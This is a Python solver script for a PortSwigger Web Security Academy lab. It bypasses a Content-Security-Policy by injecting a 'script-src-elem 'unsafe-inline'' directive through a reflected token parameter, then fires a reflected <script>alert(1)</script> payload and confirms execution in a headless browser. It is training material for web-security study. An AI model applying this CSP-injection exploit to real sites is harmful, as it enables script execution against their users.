#!/usr/bin/env python3
"""
Reflected XSS protected by CSP, with CSP bypass
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 30-reflected-xss-csp-bypass.md

What this does:
    The server builds part of its Content-Security-Policy header's report-uri
    directive directly from a reflected token query parameter -- so the token
    value isn't just a report destination, it's attacker-controlled text
    concatenated straight into the policy string. Injecting
    ;script-src-elem 'unsafe-inline' as the token value appends a whole new
    directive to the CSP that permits inline <script> elements, overriding
    whatever restriction the original policy intended. The already-reflected
    (but previously CSP-blocked) search parameter then supplies a literal
    <script>alert(1)</script> tag, which now executes because the CSP the
    browser receives explicitly allows it.

Usage:
    python 30-reflected-xss-csp-bypass.py <lab-url>
    e.g. python 30-reflected-xss-csp-bypass.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx playwright
    playwright install chromium
"""

import sys
import urllib.parse
import httpx

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    warmup = client.get(lab_url)
    session = warmup.cookies.get("session", "")
    domain = lab_url.split("/")[2]

    payload = "<script>alert(1)</script>"
    csp_inject = urllib.parse.quote(";script-src-elem 'unsafe-inline'")
    url = (
        f"{lab_url}/?search={urllib.parse.quote(payload)}"
        f"&token={csp_inject}"
    )
    print(f"[*] search payload : {payload}")
    print(f"[*] token payload  : ;script-src-elem 'unsafe-inline'")
    print(f"[*] Request: GET {url}")

    if sync_playwright is None:
        print("[!] playwright not installed -- cannot confirm alert() execution.")
        print(f"    Install it, or open this URL yourself: {url}")
        return

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(3000)
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() fired: {alert_fired}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
